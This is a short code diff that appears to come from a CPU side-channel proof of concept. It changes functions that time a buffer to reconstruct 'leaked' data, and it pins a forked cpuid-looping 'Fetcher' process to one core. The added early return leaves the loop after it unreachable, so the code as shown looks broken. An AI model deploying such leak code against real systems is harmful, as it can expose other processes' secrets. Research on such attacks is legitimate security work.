@@ -294,9 +294,6 @@ uint64_t find_prefix(unsigned char *timing_buff, unsigned char *values, int star
         }
     }
 
-    // printf("\n[#] Arch.:  0x%016" PRIx64 "\n", arch);
-    // printf(" |- Trans.: 0x%016" PRIx64 "\n", *(uint64_t *)leaked);
-
     return *(uint64_t *)&leaked;
 }
 
@@ -306,6 +303,11 @@ int phase1(unsigned char *leak, unsigned char *timing_buff, int amount_to_read, 
     pid_t pid = fork();
     if (pid == 0) {
         // In Fetcher
+
+        cpu_set_t set;
+        CPU_ZERO(&set);
+        CPU_SET(5, &set);
+        return sched_setaffinity(0, sizeof(set), &set);
         while (1) {
             asm volatile("movabs $0x80000002, %%rax\ncpuid\n":::"rax","ebx","ecx","edx");
             // usleep(1000);
